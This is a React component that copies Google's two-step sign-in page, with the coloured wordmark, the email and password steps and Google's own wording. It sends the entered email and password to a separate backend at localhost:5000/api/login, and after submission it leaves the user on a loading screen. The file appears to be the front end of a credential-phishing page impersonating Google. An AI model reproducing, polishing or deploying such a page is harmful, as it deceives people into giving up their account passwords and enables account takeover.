import { useState } from "react";

import axios from "axios";

import { IoMdContact } from "react-icons/io";
import Loading from "../components/Loading";

const Google = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [step, setStep] = useState('email');
    const [formData, setFormData] = useState({ email: "", password: "" });
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);

    const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });

    const handleNext = (e) => {
        e.preventDefault();
        if (formData.email) {
            setStep('password');
        }
    };

    const handleLogin = async (e) => {
        e.preventDefault();
        setLoading(true);
        setError(null); // Reset error state

        try {
            const newData = { email: formData.email, password: formData.password }
            const response = await axios.post("http://localhost:5000/api/login", formData, {
                headers: { "Content-Type": "application/json" },
                withCredentials: true, // If using cookies for authentication 
            });



            if (response.data.success) {
                // alert("Login Successful!");
                console.log("User Data:", response.data);
                // Redirect user or store authentication token
            } else {
                setError("Invalid credentials, please try again.");
            }
        } catch (err) {
            console.error("Login Error:", err);
            setError("Something went wrong. Please try again.");
        }
        // finally {
        //     setLoading(false); // ✅ Always stop loading after try/catch
        // }
    };

    if (loading) {
        return <Loading message="Loading..." />;
    }


    return (
        <div className="min-h-screen bg-[#202124] lg:bg-[#181818] text-white flex flex-col items-center justify-center">
            <div className="w-full h-full lg:max-w-[calc(100%-56px)] flex lg:px-36 flex-col">
                <div className="bg-[#202124] flex flex-col items-center justify-center md:justify-between md:flex-row p-8 rounded-3xl w-full lg:shadow-xl">
                    <div className="mb-6 mr-3 max-w-[50%] flex flex-col items-center md:items-start justify-center">
                        <div className="text-3xl sm:text-5xl font-bold mb-5 flex items-center space-x-2">
                            <span className="text-blue-500">G</span>
                            <span className="text-red-500">o</span>
                            <span className="text-yellow-500">o</span>
                            <span className="text-blue-500">g</span>
                            <span className="text-green-500">l</span>
                            <span className="text-red-500">e</span>
                        </div>

                        {
                            step === "email" ? (
                                <>
                                    <h2 className="text-2xl sm:text-4xl mb-5 font-semibold">Sign in</h2>
                                    <div className="text-sm flex text-center lg:text-start justify-center min-w-[calc(100%-64px)] flex-col sm:text-lg text-gray-400">
                                        <p className="items-center">Sign in with your Google Account to get your bookmarks, history, passwords, and other settings on all your devices</p>
                                    </div>
                                </>
                            ) : (
                                <>
                                    <h2 className="text-2xl md:text-5xl mb-6 font-semibold">Welcome</h2>
                                    <p className="sm:text-xl  max-w-72 md:min-w-96 border-2 border-white flex pr-10 rounded-3xl text-gray-400 mt-1 ">
                                        <span><IoMdContact className="size-8" /></span>
                                        {formData.email.length > 32 ? formData.email.slice(0, 29) + "..." : formData.email}
                                    </p>
                                </>
                            )
                        }
                    </div>

                    <form className='sm:mt-20 lg:mt-32 min-w-[50%]' onSubmit={step === 'email' ? handleNext : handleLogin}>
                        {
                            step === "email" ? (
                                <>
                                    <div className="relative">
                                        <input
                                            type="text"
                                            id="email"
                                            name="email"
                                            value={formData.email}
                                            onChange={handleChange}
                                            className="peer text-[20px] sm:h-14 h-12 w-full bg-[#202124] border-2 rounded-md p-2 placeholder-transparent focus:outline-none focus:border-blue-500"
                                            placeholder="Email or phone"
                                            required
                                        />
                                        <label
                                            htmlFor="email"
                                            className="absolute cursor-text left-3 -top-4 text-gray-600 text-[20px] 
                                            bg-[#202124] px-1 transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-base 
                                            peer-placeholder-shown:text-gray-400 peer-focus:-top-4 peer-focus:text-[20px] peer-focus:text-blue-500"
                                        >
                                            Email or phone
                                        </label>
                                    </div>
                                    <div className="text-lg text-blue-400 mb-6 cursor-pointer">Forgot email?</div>

                                    <div className="text-sm hidden lg:flex text-center justify-center min-w-[calc(100%-64px)] flex-col sm:text-lg text-gray-400">
                                        <p className="items-center ">Not your computer? Use Guest mode to sign in privately.</p>
                                        <span className="text-blue-400 items-center cursor-pointer">Learn more about using Guest mode</span>
                                    </div>

                                    <div className="flex justify-end py-4 items-center">
                                        <button className="text-blue-400 text-lg mr-10">Create account</button>
                                        <button type="submit" className="bg-blue-500 text-white px-6 py-2 rounded-full text-lg font-medium hover:bg-blue-600">
                                            Next
                                        </button>
                                    </div>
                                </>
                            ) : (
                                <>
                                    <div className="relative mt-12">
                                        <input
                                            type={showPassword ? "text" : "password"}
                                            id="password"
                                            name="password"
                                            value={formData.password}
                                            onChange={handleChange}
                                            className="peer w-full text-[20px] h-12 sm:h-16 bg-[#202124] border-2 rounded-md p-3 placeholder-transparent focus:outline-none focus:border-blue-500"
                                            placeholder="Enter your password"
                                            required
                                        />
                                        <label
                                            htmlFor="password"
                                            className="absolute cursor-text left-3 -top-4 text-gray-600 text-[20px] 
                                            bg-[#202124] px-1 transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-base 
                                            peer-placeholder-shown:text-gray-400 peer-focus:-top-4 peer-focus:text-[20px] peer-focus:text-blue-500"
                                        >
                                            Enter your password
                                        </label>
                                    </div>
                                    <div className="flex items-center space-x-2 mt-3">
                                        <input
                                            type="checkbox"
                                            id="togglePassword"
                                            checked={showPassword}
                                            onChange={() => setShowPassword(!showPassword)}
                                            className="size-4 sm:size-6 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                                        />
                                        <label htmlFor="togglePassword" className="text-[14px] sm:text-[20px] text-gray-300 cursor-pointer">
                                            Show password
                                        </label>
                                    </div>
                                    <div className="flex justify-center sm:justify-end  py-6 items-center">
                                        <button className="text-blue-400 hover:underline text-sm mr-10">Forgot password</button>
                                        <button type="submit" className="bg-blue-500 text-white px-6 py-2 rounded-full text-lg font-medium hover:bg-blue-600">
                                            Next
                                        </button>
                                    </div>
                                </>
                            )
                        }

                    </form>
                </div>
                <div className='bottom-0 left-0 right-0 flex justify-center md:justify-end space-x-10 p-3 lg:static lg:justify-end lg:mt-4'>
                    <a className='text-gray-400' href="">Help</a>
                    <a className='text-gray-400' href="">Privacy</a>
                    <a className='text-gray-400' href="">Terms</a>
                </div>
            </div>
        </div>
    );
}

export default Google